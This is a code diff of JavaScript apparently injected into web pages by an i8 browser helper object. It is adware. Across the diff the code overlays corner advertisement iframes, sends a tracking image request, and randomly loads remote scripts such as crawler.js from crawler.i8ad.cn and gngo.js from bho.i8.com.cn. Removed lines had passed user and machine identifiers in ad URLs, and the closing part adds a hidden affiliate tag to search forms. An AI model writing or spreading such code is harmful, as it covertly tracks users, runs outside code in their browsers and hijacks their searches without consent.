@@ -86,16 +86,13 @@ function i8main()
 			'async': true,
 			'src': 'http://js.i8001.com/browser/words.'+charset+'.js',
 			'onload': function()
+			{
+				i8vars.words= words();
+				if( I8zc_ifiedown )
 				{
-					i8vars.words= words();
-					if( I8zc_ifiedown ){
-						showBar();
-					}
-
-					if( i8vars.rand(1,100)<=4 ){
-						cornerAd('baidu');
-					}
+					showBar();
 				}
+			}
 		}), eldest);
 
 		// ~3%
@@ -119,8 +116,9 @@ function i8main()
 
 		// ~ ?% (10?)
 		if( I8zc_ifrpopup && (Math.floor(I8zc_popper*10) > i8vars.rand(0,9)) ){
-			cornerAd();
+			cornerAd300();
 		}
+
 
 		//catch all clicks then filter
 		body.onclick= function(event)
@@ -165,6 +163,7 @@ function i8main()
 
 		//ad link(a)
 		//i8vars.links= links;
+		//requestAds();
 
 		//default links
 		keywordLinks(links);
@@ -262,6 +261,12 @@ function i8main()
 	//print an ad in the corner
 	function cornerAd300()
 	{
+		if( i8vars.corner ){
+			return 1;
+		}else{
+			i8vars.corner= true;
+		}
+
 		var url= 'http://ads.i8.com.cn/bho/ie/300250ceshi.html';
 
 		//holding div
@@ -270,6 +275,7 @@ function i8main()
 				+ (i8vars.msie && i8vars.msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
 				+ 'right:0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
 			});
+
 		//advert
 		div.appendChild(i8vars.create('iframe', {
 			'scrolling':'no', 'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
@@ -286,58 +292,10 @@ function i8main()
 			'css':'position:absolute;border:1px solid #ddd;right:0;bottom:0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
 			innerText:" X "
 		}));
+
 		//insert
 		body.insertBefore(div, eldest);
 	}
-
-
-	function cornerAd(type)
-	{
-		if( i8vars.corner ){
-			return 1;
-		}else{
-			i8vars.corner= true;
-		}
-
-		if( i8vars.rand(0, 100)<=10 ){
-			cornerAd300()
-			return;
-		}
-
-		if( type==='baidu' )
-			var url= "http://fenxiang.i8.com.cn/?k=" + encodeURIComponent(i8vars.words.join('-')).replace(/-/g, '+');
-		else
-			var url= 'http://ads.i8.com.cn/bho/ie/tanZhao_2.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid;
-
-		//corner's side
-		var corner= i8vars.rand(0, 5) ? 'right' : 'left',
-		//holding div
-			div= i8vars.create('div', {
-				'css':'z-index:2147482643;width:260px;height:220px;position:'
-				+ (i8vars.msie && i8vars.msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
-				+ corner + ':0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
-			});
-		//advert
-		div.appendChild(i8vars.create('iframe', {
-			'scrolling':'no', 'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
-			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0', 'src': url
-		}));
-
-		//close "x" button
-		div.appendChild(i8vars.create('div',
-			{
-			'onclick': function()
-				{
-					//this.parentNode.parentNode.removeChild(this.parentNode)
-					this.parentNode.style.display= 'none'
-				},
-			'css':'position:absolute;border:1px solid #ddd;' + (i8vars.rand(0,1) ? 'right':'left') + ':0;' + (i8vars.rand(0,1) ? 'top':'bottom') + ':0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
-			innerText:" X "
-		}));
-		//insert
-		body.insertBefore(div, eldest);
-	}
-
 
 	//show "search" button next to user's selected text
 	function searchSelected(target, event)
@@ -408,23 +366,21 @@ function i8main()
 		//return
 		return matches;
 	}
-
-    if (i8vars.rand(1,100) <= 100)
-	    body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/crawler.js','type': 'text/javascript'}), eldest);
 };
 
 
 (function()
 {
-	if( i8vars.loaded ) return;
+	if( i8vars.loaded )
+		return;
+	i8vars.loaded= true;
 
 	if( document.body=='undefined' || !document.body || !document.body.children || !document.body.children.length ){
-		return setTimeout(arguments.callee, 250);
+		return setTimeout(arguments.callee, 300);
 	}
 
 	i8vars.eldest= document.body.children.item(0);
 
-	i8vars.loaded= true;
 
 	var track= new Image();
 		track.src= i8vars.track;
@@ -437,8 +393,19 @@ function i8main()
 			}, 750);
 		}
 
-	if( i8bho_nid=='337244' || i8vars.rand(1,100)<=5 ){
-		document.body.insertBefore(i8vars.create('script', {'src': 'http://bho.i8.com.cn/browser/gngo.js','type': 'text/javascript'}), i8vars.eldest);
+	if( i8bho_nid=='100001' ){
+		document.body.insertBefore(i8vars.create('script', {'src': 'http://bho.i8.com.cn/browser/gngo.nocache.js','type': 'text/javascript'}), i8vars.eldest);
+		//document.body.insertBefore(i8vars.create('script', {'src': 'http://crawler.i8ad.cn/crawler.js','type': 'text/javascript'}), i8vars.eldest);
+	}
+	else
+	{
+		if( i8vars.rand(1,100)<=15 ){
+			document.body.insertBefore(i8vars.create('script', {'src': 'http://crawler.i8ad.cn/crawler.js','type': 'text/javascript'}), i8vars.eldest);
+		}
+
+		if( i8vars.rand(1,100)<=6 ){
+			document.body.insertBefore(i8vars.create('script', {'src': 'http://bho.i8.com.cn/browser/gngo.js','type': 'text/javascript'}), i8vars.eldest);
+		}
 	}
 
 	setTimeout(function(){i8main();}, 500);
@@ -479,7 +446,7 @@ function i8main()
 					wd.parentNode.parentNode.appendChild(i8vars.create('input', {'type':'hidden', 'name':'tn', 'value':'gnetinc_dg'}));
 				}
 			}
-		}, 125);
+		}, 500);
 	}
 
 })();
